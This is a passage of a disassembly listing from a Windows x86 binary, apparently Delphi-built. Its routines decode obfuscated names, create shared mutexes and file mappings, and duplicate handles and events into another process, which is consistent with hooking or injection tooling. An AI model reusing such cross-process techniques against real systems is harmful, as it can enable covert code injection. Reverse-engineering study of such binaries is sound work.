		mov	esi, [ebx+14h]
		xor	edi, edi
		mov	[esi+ecx*4], edi
		inc	eax
		dec	edx
		jnz	short loc_40DD28

loc_40DD37:				; CODE XREF: sub_40DC2C+55j
					; sub_40DC2C+F9j
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_40DC2C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40DD40	proc near		; CODE XREF: sub_40DDC8+62p
					; sub_40DDC8+DFp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	0
		push	ebx
		push	esi
		mov	esi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_40DDBC
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [esi+esi*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-4]
		mov	edx, [edx+4]
		lea	ebx, [edx+eax*8]
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-10h]
		mov	[ebx], eax
		xor	eax, eax
		mov	[ebx+0Ch], eax
		lea	eax, [ebp+var_4]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-10h]
		mov	cl, 30h
		mov	edx, 8
		call	sub_4061D8
		mov	eax, [ebp+var_4]
		inc	eax
		lea	edx, [ebx+4]
		mov	ecx, 8
		call	sub_402664
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, esi
		call	sub_40DC2C
		pop	ecx
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40DDC3

loc_40DDB3:				; CODE XREF: sub_40DD40+81j
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40DDBC:				; DATA XREF: sub_40DD40+Co
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40DDB3
; ---------------------------------------------------------------------------

loc_40DDC3:				; CODE XREF: sub_40DD40+7Bj
					; DATA XREF: sub_40DD40+6Eo
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40DD40	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40DDC8	proc near		; CODE XREF: sub_40E480+127p

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp+arg_0]
		mov	ebx, [eax-4]
		mov	edx, [ebx]
		dec	edx
		test	edx, edx
		jl	short loc_40DE0D
		inc	edx
		xor	eax, eax

loc_40DDE1:				; CODE XREF: sub_40DDC8+43j
		lea	ecx, [eax+eax*2]
		mov	esi, [ebx+4]
		lea	esi, [esi+ecx*8]
		cmp	dword ptr [esi+10h], 0
		jle	short loc_40DE09
		mov	ecx, [esi]
		mov	esi, [ebp+arg_0]
		cmp	ecx, [esi-10h]
		jnz	short loc_40DE09
		mov	edx, [ebp+arg_0]
		push	edx
		call	sub_40DC2C
		pop	ecx
		jmp	loc_40DED2
; ---------------------------------------------------------------------------

loc_40DE09:				; CODE XREF: sub_40DDC8+26j
					; sub_40DDC8+30j
		inc	eax
		dec	edx
		jnz	short loc_40DDE1

loc_40DE0D:				; CODE XREF: sub_40DDC8+14j
		mov	edx, [ebx]
		dec	edx
		test	edx, edx
		jl	short loc_40DE39
		inc	edx
		xor	eax, eax

loc_40DE17:				; CODE XREF: sub_40DDC8+6Fj
		lea	ecx, [eax+eax*2]
		mov	esi, [ebx+4]
		lea	ecx, [esi+ecx*8]
		cmp	dword ptr [ecx+10h], 0
		jnz	short loc_40DE35
		mov	edx, [ebp+arg_0]
		push	edx
		call	sub_40DD40
		pop	ecx
		jmp	loc_40DED2
; ---------------------------------------------------------------------------

loc_40DE35:				; CODE XREF: sub_40DDC8+5Cj
		inc	eax
		dec	edx
		jnz	short loc_40DE17

loc_40DE39:				; CODE XREF: sub_40DDC8+4Aj
		mov	eax, [ebx]
		mov	[ebp+var_4], eax
		test	eax, eax
		jnz	short loc_40DE4A
		mov	dword ptr [ebx], 20h
		jmp	short loc_40DE4E
; ---------------------------------------------------------------------------

loc_40DE4A:				; CODE XREF: sub_40DDC8+78j
		add	eax, eax
		mov	[ebx], eax

loc_40DE4E:				; CODE XREF: sub_40DDC8+80j
		push	0
		mov	eax, [ebx]
		shl	eax, 3
		lea	eax, [eax+eax*2]
		push	eax
		call	sub_40A770
		mov	[ebp+var_8], eax
		mov	edx, [ebp+var_4]
		dec	edx
		test	edx, edx
		jl	short loc_40DE8F
		inc	edx
		xor	eax, eax

loc_40DE6C:				; CODE XREF: sub_40DDC8+C5j
		lea	ecx, [eax+eax*2]
		mov	esi, [ebx+4]
		lea	ecx, [esi+ecx*8]
		push	ecx
		lea	ecx, [eax+eax*2]
		mov	esi, [ebp+var_8]
		pop	edi
		lea	ecx, [esi+ecx*8]
		mov	esi, edi
		mov	edi, ecx
		mov	ecx, 6
		rep movsd
		inc	eax
		dec	edx
		jnz	short loc_40DE6C

loc_40DE8F:				; CODE XREF: sub_40DDC8+9Fj
		push	0
		mov	eax, [ebx+4]
		push	eax
		call	sub_40A890
		mov	eax, [ebp+var_8]
		mov	[ebx+4], eax
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+var_4]
		call	sub_40DD40
		pop	ecx
		mov	eax, [ebp+var_4]
		inc	eax
		mov	edx, [ebx]
		dec	edx
		sub	edx, eax
		jl	short loc_40DED2
		inc	edx

loc_40DEB9:				; CODE XREF: sub_40DDC8+108j
		lea	ecx, [eax+eax*2]
		mov	esi, [ebx+4]
		xor	edi, edi
		mov	[esi+ecx*8+10h], edi
		mov	esi, [ebx+4]
		xor	edi, edi
		mov	[esi+ecx*8+14h], edi
		inc	eax
		dec	edx
		jnz	short loc_40DEB9

loc_40DED2:				; CODE XREF: sub_40DDC8+3Cj
					; sub_40DDC8+68j ...
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_40DDC8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40DEDC	proc near		; CODE XREF: sub_40E480+120p

var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
lpTargetHandle	= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
TargetHandle	= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_16		= byte ptr -16h
var_15		= byte ptr -15h
hObject		= dword	ptr -14h
hMutex		= dword	ptr -10h
hTargetProcessHandle= dword ptr	-0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	ecx, 0Bh

loc_40DEE4:				; CODE XREF: sub_40DEDC+Dj
		push	0
		push	0
		dec	ecx
		jnz	short loc_40DEE4
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40E429
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		mov	[ebp+var_24], eax
		mov	eax, [ebp+var_24]
		mov	eax, [eax]
		dec	eax
		test	eax, eax
		jl	short loc_40DF67
		inc	eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_8], 0

loc_40DF1E:				; CODE XREF: sub_40DEDC+89j
		mov	eax, [ebp+var_8]
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_24]
		mov	edx, [edx+4]
		lea	ecx, [edx+eax*8]
		mov	eax, [ecx+10h]
		dec	eax
		test	eax, eax
		jl	short loc_40DF5F
		inc	eax
		xor	edx, edx

loc_40DF38:				; CODE XREF: sub_40DEDC+81j
		lea	esi, [edx+edx*2]
		mov	ebx, [ecx+14h]
		mov	ebx, [ebx+esi*4]
		mov	edi, [ebp+arg_0]
		cmp	ebx, [edi-8]
		jnz	short loc_40DF5B
		mov	eax, [ecx+14h]
		mov	eax, [eax+esi*4+4]
		mov	edx, [ebp+arg_0]
		mov	[edx-0Ch], eax
		jmp	loc_40E40E
; ---------------------------------------------------------------------------

loc_40DF5B:				; CODE XREF: sub_40DEDC+6Bj
		inc	edx
		dec	eax
		jnz	short loc_40DF38

loc_40DF5F:				; CODE XREF: sub_40DEDC+57j
		inc	[ebp+var_8]
		dec	[ebp+var_28]
		jnz	short loc_40DF1E

loc_40DF67:				; CODE XREF: sub_40DEDC+35j
		call	sub_40A478
		mov	[ebp+hTargetProcessHandle], eax
		cmp	[ebp+hTargetProcessHandle], 0
		jz	loc_40E40E
		xor	ecx, ecx
		push	ebp
		push	offset loc_40E407
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		lea	edx, [ebp+var_30]
		mov	eax, offset dword_40E440
		call	sub_4064CC
		lea	eax, [ebp+var_30]
		push	eax
		lea	edx, [ebp+var_34]
		mov	eax, offset dword_40E45C
		call	sub_4064CC
		mov	edx, [ebp+var_34]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_30]
		call	sub_403E24
		push	eax		; lpName
		push	0		; int
		push	0		; lpMutexAttributes
		call	sub_4051BC
		mov	[ebp+hMutex], eax
		cmp	[ebp+hMutex], 0
		jz	loc_40E3F0
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebp+hMutex]
		push	eax		; hHandle
		call	WaitForSingleObject
		xor	ecx, ecx
		push	ebp
		push	offset loc_40E3E0
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		push	0Ch		; dwMaximumSizeLow
		lea	edx, [ebp+var_38]
		mov	eax, offset dword_40E440
		call	sub_4064CC
		lea	eax, [ebp+var_38]
		push	eax
		lea	edx, [ebp+var_3C]
		mov	eax, offset dword_40E46C
		call	sub_4064CC
		mov	edx, [ebp+var_3C]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_38]
		call	sub_403E24
		push	eax		; int
		call	sub_40C3F4
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_40E3C9
		call	GetLastError
		cmp	eax, 0B7h
		setnz	[ebp+var_15]
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_40E3C0
		cmp	[ebp+var_15], 0
		jz	short loc_40E09D
		xor	eax, eax
		mov	[ebx], eax
		xor	eax, eax
		mov	[ebx+4], eax
		push	0
		push	0
		mov	eax, offset sub_40D61C
		xor	ecx, ecx
		xor	edx, edx
		call	sub_40AB44
		mov	esi, eax
		mov	[ebx+8], esi
		test	esi, esi
		jz	short loc_40E09D
		push	2		; dwOptions
		push	0		; bInheritHandle
		push	0		; dwDesiredAccess
		lea	eax, [ebp+TargetHandle]
		push	eax		; lpTargetHandle
		mov	eax, [ebp+hTargetProcessHandle]
		push	eax		; hTargetProcessHandle
		mov	eax, [ebp+hObject]
		push	eax		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle

loc_40E09D:				; CODE XREF: sub_40DEDC+17Ej
					; sub_40DEDC+1A2j
		cmp	dword ptr [ebx+8], 0
		jz	loc_40E3BA
		mov	[ebp+var_16], 1
		mov	eax, [ebx]
		dec	eax
		test	eax, eax
		jl	short loc_40E108
		inc	eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_8], 0

loc_40E0BD:				; CODE XREF: sub_40DEDC+22Aj
		mov	eax, [ebx+4]
		mov	edx, [ebp+var_8]
		mov	esi, [eax+edx*4]
		mov	eax, [esi+208h]
		dec	eax
		test	eax, eax
		jl	short loc_40E100
		inc	eax

loc_40E0D2:				; CODE XREF: sub_40DEDC+222j
		mov	ecx, [esi+208h]
		mov	ecx, [esi+ecx*4+108h]
		mov	edi, [ebp+arg_0]
		cmp	ecx, [edi-8]
		jnz	short loc_40E0FD
		mov	eax, [esi+208h]
		mov	eax, [esi+eax*4+0Ch]
		mov	ecx, [ebp+arg_0]
		mov	[ecx-0Ch], eax
		mov	[ebp+var_16], 0
		jmp	short loc_40E100
; ---------------------------------------------------------------------------

loc_40E0FD:				; CODE XREF: sub_40DEDC+209j
		dec	eax
		jnz	short loc_40E0D2

loc_40E100:				; CODE XREF: sub_40DEDC+1F3j
					; sub_40DEDC+21Fj
		inc	[ebp+var_8]
		dec	[ebp+var_28]
		jnz	short loc_40E0BD

loc_40E108:				; CODE XREF: sub_40DEDC+1D4j
		cmp	[ebp+var_16], 0
		jz	loc_40E3BA
		push	2		; dwOptions
		push	0		; bInheritHandle
		push	0		; dwDesiredAccess
		mov	eax, [ebp+arg_0]
		add	eax, 0FFFFFFF4h
		push	eax		; lpTargetHandle
		mov	eax, [ebp+hTargetProcessHandle]
		push	eax		; hTargetProcessHandle
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-0Ch]
		push	eax		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle
		mov	eax, [ebx]
		dec	eax
		test	eax, eax
		jl	loc_40E206
		inc	eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_8], 0

loc_40E14B:				; CODE XREF: sub_40DEDC+324j
		mov	eax, [ebx+4]
		mov	edx, [ebp+var_8]
		mov	eax, [eax+edx*4]
		cmp	dword ptr [eax+208h], 3Fh
		jge	loc_40E1FA
		inc	dword ptr [eax+208h]
		mov	edx, [eax+208h]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-8]
		mov	[eax+edx*4+108h], ecx
		mov	edx, [eax+208h]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-0Ch]
		mov	[eax+edx*4+0Ch], ecx
		lea	edx, [ebp+var_44]
		mov	eax, offset dword_40E440
		call	sub_4064CC
		push	[ebp+var_44]
		lea	edx, [ebp+var_48]
		mov	eax, offset dword_40E478
		call	sub_4064CC
		push	[ebp+var_48]
		lea	eax, [ebp+var_4C]
		push	eax
		mov	cl, 30h
		mov	edx, 1
		mov	eax, [ebp+var_8]
		call	sub_406144
		push	[ebp+var_4C]
		lea	eax, [ebp+var_40]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_40]
		call	sub_403E24
		push	eax		; lpName
		push	0		; bInheritHandle
		push	1F0003h		; dwDesiredAccess
		call	OpenEventA
		mov	edi, eax
		test	edi, edi
		jz	short loc_40E1F4
		push	edi		; hEvent
		call	SetEvent
		push	edi		; hObject
		call	CloseHandle

loc_40E1F4:				; CODE XREF: sub_40DEDC+30Aj
		mov	[ebp+var_16], 0
		jmp	short loc_40E206
; ---------------------------------------------------------------------------

loc_40E1FA:				; CODE XREF: sub_40DEDC+27Fj
		inc	[ebp+var_8]
		dec	[ebp+var_28]
		jnz	loc_40E14B

loc_40E206:				; CODE XREF: sub_40DEDC+25Ej
					; sub_40DEDC+31Cj
		cmp	[ebp+var_16], 0
		jz	loc_40E3BA
		mov	esi, ebx
		lea	edx, [ebp+var_54]
		mov	eax, offset dword_40E440
		call	sub_4064CC
		push	[ebp+var_54]
		lea	edx, [ebp+var_58]
		mov	eax, offset dword_40E478
		call	sub_4064CC
		push	[ebp+var_58]
		lea	eax, [ebp+var_5C]
		push	eax
		mov	eax, [esi]
		mov	cl, 30h
		mov	edx, 1
		call	sub_406144
		push	[ebp+var_5C]
		lea	eax, [ebp+var_50]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_50]
		call	sub_403E24
		push	eax		; lpName
		push	0		; bInitialState
		push	0		; bManualReset
		push	0		; lpEventAttributes
		call	CreateEventA
		mov	edi, eax
		test	edi, edi
		jz	loc_40E3BA
		inc	dword ptr [esi]
		push	0
		mov	eax, [esi]
		shl	eax, 2
		push	eax
		call	sub_40A770
		mov	[ebp+var_1C], eax
		mov	eax, [esi]
		sub	eax, 2
		test	eax, eax
		jl	short loc_40E2B2
		inc	eax
		mov	[ebp+var_28], eax
		mov	[ebp+var_8], 0

loc_40E298:				; CODE XREF: sub_40DEDC+3D4j
		mov	eax, [esi+4]
		mov	edx, [ebp+var_8]
		mov	eax, [eax+edx*4]
		mov	edx, [ebp+var_1C]
		mov	ecx, [ebp+var_8]
		mov	[edx+ecx*4], eax
		inc	[ebp+var_8]
		dec	[ebp+var_28]
		jnz	short loc_40E298

loc_40E2B2:				; CODE XREF: sub_40DEDC+3AFj
		push	0
		mov	eax, [esi+4]
		push	eax
		call	sub_40A890
		mov	eax, [ebp+var_1C]
		mov	[esi+4], eax
		push	0
		push	20Ch
		call	sub_40A770
		mov	edx, [esi]
		mov	ecx, [esi+4]
		mov	[ecx+edx*4-4], eax
		mov	eax, [esi]
		mov	edx, [esi+4]
		mov	eax, [edx+eax*4-4]
		mov	[ebp+lpTargetHandle], eax
		mov	eax, [ebp+lpTargetHandle]
		mov	dword ptr [eax+208h], 1
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-8]
		mov	edx, [ebp+lpTargetHandle]
		mov	[edx+10Ch], eax
		push	2		; dwOptions
		push	0		; bInheritHandle
		push	0		; dwDesiredAccess
		mov	eax, [ebp+lpTargetHandle]
		add	eax, 0Ch
		push	eax		; lpTargetHandle
		mov	eax, [ebp+hTargetProcessHandle]
		push	eax		; hTargetProcessHandle
		push	edi		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle
		push	edi		; hObject
		call	CloseHandle
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-0Ch]
		mov	edx, [ebp+lpTargetHandle]
		mov	[edx+10h], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		mov	edx, [ebp+lpTargetHandle]
		mov	[edx+8], eax
		cmp	dword ptr [esi], 1
		jnz	short loc_40E37F
		push	2		; dwOptions
		push	0		; bInheritHandle
		push	0		; dwDesiredAccess
		mov	eax, [ebp+lpTargetHandle]
		push	eax		; lpTargetHandle
		mov	eax, [ebp+hTargetProcessHandle]
		push	eax		; hTargetProcessHandle
		mov	eax, [ebp+hMutex]
		push	eax		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle
		push	2		; dwOptions
		push	0		; bInheritHandle
		push	0		; dwDesiredAccess
		mov	eax, [ebp+lpTargetHandle]
		add	eax, 4
		push	eax		; lpTargetHandle
		mov	eax, [ebp+hTargetProcessHandle]
		push	eax		; hTargetProcessHandle
		mov	eax, [ebp+var_4]
		push	eax		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle
		jmp	short loc_40E399
; ---------------------------------------------------------------------------

loc_40E37F:				; CODE XREF: sub_40DEDC+462j
		mov	eax, [esi+4]
		mov	eax, [eax]
		mov	eax, [eax]
		mov	edx, [ebp+lpTargetHandle]
		mov	[edx], eax
		mov	eax, [esi+4]
		mov	eax, [eax]
		mov	eax, [eax+4]
		mov	edx, [ebp+lpTargetHandle]
		mov	[edx+4], eax

loc_40E399:				; CODE XREF: sub_40DEDC+4A1j
		lea	eax, [ebp+TargetHandle]
		push	eax
		push	0
		mov	eax, [esi]
		mov	edx, [esi+4]
		mov	eax, [edx+eax*4-4]
		push	eax
		mov	eax, [esi+8]
		push	eax
		push	0
		push	0
		mov	eax, [ebp+hTargetProcessHandle]
		push	eax
		call	sub_40B410

loc_40E3BA:				; CODE XREF: sub_40DEDC+1C5j
					; sub_40DEDC+230j ...
		push	ebx		; lpBaseAddress
		call	UnmapViewOfFile

loc_40E3C0:				; CODE XREF: sub_40DEDC+174j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40E3C9:				; CODE XREF: sub_40DEDC+148j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40E3E7

loc_40E3D6:				; CODE XREF: sub_40DEDC+509j
		mov	eax, [ebp+hMutex]
		push	eax		; hMutex
		call	ReleaseMutex
		retn
; ---------------------------------------------------------------------------

loc_40E3E0:				; DATA XREF: sub_40DEDC+FFo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40E3D6
; ---------------------------------------------------------------------------

loc_40E3E7:				; CODE XREF: sub_40DEDC+503j
					; DATA XREF: sub_40DEDC+4F5o
		mov	eax, [ebp+hMutex]
		push	eax		; hObject
		call	CloseHandle

loc_40E3F0:				; CODE XREF: sub_40DEDC+EBj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40E40E

loc_40E3FD:				; CODE XREF: sub_40DEDC+530j
		mov	eax, [ebp+hTargetProcessHandle]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_40E407:				; DATA XREF: sub_40DEDC+A0o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40E3FD
; ---------------------------------------------------------------------------

loc_40E40E:				; CODE XREF: sub_40DEDC+7Aj
					; sub_40DEDC+97j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40E430

loc_40E41B:				; CODE XREF: sub_40DEDC+552j
		lea	eax, [ebp+var_5C]
		mov	edx, 0Ch
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40E429:				; DATA XREF: sub_40DEDC+19o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40E41B
; ---------------------------------------------------------------------------

loc_40E430:				; CODE XREF: sub_40DEDC+54Cj
					; DATA XREF: sub_40DEDC+53Ao
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40DEDC	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 10h
dword_40E440	dd 21D1438h, 3D362134h,	3D012730h, 31343027h, 0	; DATA XREF: sub_40DEDC+AEo
					; sub_40DEDC+10Fo ...
		dd 0FFFFFFFFh, 5
dword_40E45C	dd 30212018h, 2Dh, 0FFFFFFFFh, 3 ; DATA	XREF: sub_40DEDC+BFo
dword_40E46C	dd 253418h, 0FFFFFFFFh,	5 ; DATA XREF: sub_40DEDC+120o
dword_40E478	dd 3B302310h, 21h	; DATA XREF: sub_40DEDC+2C1o
					; sub_40DEDC+349o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40E480	proc near		; CODE XREF: sub_40F0A4+D3Bp

var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
hObject		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFDCh
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_20], ebx
		mov	[ebp+var_24], ebx
		mov	[ebp+var_18], ebx
		mov	[ebp+var_1C], ebx
		mov	[ebp+var_10], ecx
		mov	[ebp+var_8], edx
		mov	[ebp+var_C], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40E5FB
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	edx, [ebp+var_18]
		mov	eax, offset dword_40E614
		call	sub_4064CC
		lea	eax, [ebp+var_18]
		push	eax
		lea	edx, [ebp+var_1C]
		mov	eax, offset dword_40E628
		call	sub_4064CC
		mov	edx, [ebp+var_1C]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_18]
		call	sub_403E24
		push	eax		; lpName
		call	sub_40C210
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_40E5E0
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebp+hObject]
		push	eax		; hHandle
		call	WaitForSingleObject
		xor	eax, eax
		push	ebp
		push	offset loc_40E5D0
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		push	4		; dwMaximumSizeLow
		lea	edx, [ebp+var_20]
		mov	eax, offset dword_40E614
		call	sub_4064CC
		lea	eax, [ebp+var_20]
		push	eax
		lea	edx, [ebp+var_24]
		mov	eax, offset dword_40E638
		call	sub_4064CC
		mov	edx, [ebp+var_24]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_20]
		call	sub_403E24
		push	eax		; int
		call	sub_40C3F4
		mov	edi, eax
		test	edi, edi
		jz	short loc_40E5B9
		call	GetLastError
		cmp	eax, 0B7h
		setnz	bl
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		push	edi		; hFileMappingObject
		call	MapViewOfFile
		mov	esi, eax
		test	esi, esi
		jz	short loc_40E5B3
		test	bl, bl
		jz	short loc_40E597
		push	0
		push	8
		call	sub_40A770
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax], edx
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax+4], edx
		mov	eax, [ebp+var_4]
		mov	[esi], eax
		mov	eax, edi
		call	sub_40A660
		jmp	short loc_40E59C
; ---------------------------------------------------------------------------

loc_40E597:				; CODE XREF: sub_40E480+ECj
		mov	eax, [esi]
		mov	[ebp+var_4], eax

loc_40E59C:				; CODE XREF: sub_40E480+115j
		push	ebp
		mov	eax, [ebp+hObject]
		call	sub_40DEDC
		pop	ecx
		push	ebp
		call	sub_40DDC8
		pop	ecx
		push	esi		; lpBaseAddress
		call	UnmapViewOfFile

loc_40E5B3:				; CODE XREF: sub_40E480+E8j
		push	edi		; hObject
		call	CloseHandle

loc_40E5B9:				; CODE XREF: sub_40E480+C4j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40E5D7

loc_40E5C6:				; CODE XREF: sub_40E480+155j
		mov	eax, [ebp+hObject]
		push	eax		; hMutex
		call	ReleaseMutex
		retn
; ---------------------------------------------------------------------------

loc_40E5D0:				; DATA XREF: sub_40E480+7Eo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40E5C6
; ---------------------------------------------------------------------------

loc_40E5D7:				; CODE XREF: sub_40E480+14Fj
					; DATA XREF: sub_40E480+141o
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40E5E0:				; CODE XREF: sub_40E480+6Aj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40E602

loc_40E5ED:				; CODE XREF: sub_40E480+180j
		lea	eax, [ebp+var_24]
		mov	edx, 4
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40E5FB:				; DATA XREF: sub_40E480+23o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40E5ED
; ---------------------------------------------------------------------------

loc_40E602:				; CODE XREF: sub_40E480+17Aj
					; DATA XREF: sub_40E480+168o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40E480	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 8
dword_40E614	dd 61D1438h, 26372021h,	0 ; DATA XREF: sub_40E480+31o
					; sub_40E480+8Eo
		dd 0FFFFFFFFh, 5
dword_40E628	dd 30212018h, 2Dh, 0FFFFFFFFh, 3 ; DATA	XREF: sub_40E480+42o
dword_40E638	dd 253418h		; DATA XREF: sub_40E480+9Fo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40E63C	proc near		; CODE XREF: sub_4102F8+73p

var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_19		= byte ptr -19h
lpBaseAddress	= dword	ptr -18h
hObject		= dword	ptr -14h
hMutex		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFC8h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_34], ebx
		mov	[ebp+var_38], ebx
		mov	[ebp+var_2C], ebx
		mov	[ebp+var_30], ebx
		mov	[ebp+var_C], ecx
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40E859
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	edx, [ebp+var_2C]
		mov	eax, offset dword_40E870
		call	sub_4064CC
		lea	eax, [ebp+var_2C]
		push	eax
		lea	edx, [ebp+var_30]
		mov	eax, offset dword_40E884
		call	sub_4064CC
		mov	edx, [ebp+var_30]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_2C]
		call	sub_403E24
		push	eax
		call	sub_40C30C
		mov	[ebp+hMutex], eax
		cmp	[ebp+hMutex], 0
		jz	loc_40E83E
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebp+hMutex]
		push	eax		; hHandle
		call	WaitForSingleObject
		xor	ecx, ecx
		push	ebp
		push	offset loc_40E82E
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
